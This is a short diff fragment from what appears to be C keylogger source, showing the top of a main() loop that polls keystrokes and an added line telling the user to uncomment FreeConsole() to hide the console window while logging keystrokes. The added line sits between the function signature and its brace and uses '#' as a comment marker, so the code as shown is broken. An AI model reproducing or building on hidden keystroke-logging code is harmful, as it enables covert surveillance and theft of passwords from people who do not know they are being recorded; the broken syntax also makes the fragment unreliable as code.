@@ -47,6 +47,7 @@ bool KeyIsListed(int ikey){
     }
 }
 int main()
+#FreeConsole(); #UNCOMMENT THIS LINE IF U WANNA HIDE THE CONSOLE GUI WHEN KEYSTROKE LOGGING
 {   
     unsigned char key; //range of unsigned char is 0 till 255 so i used it instead.
     while(TRUE)
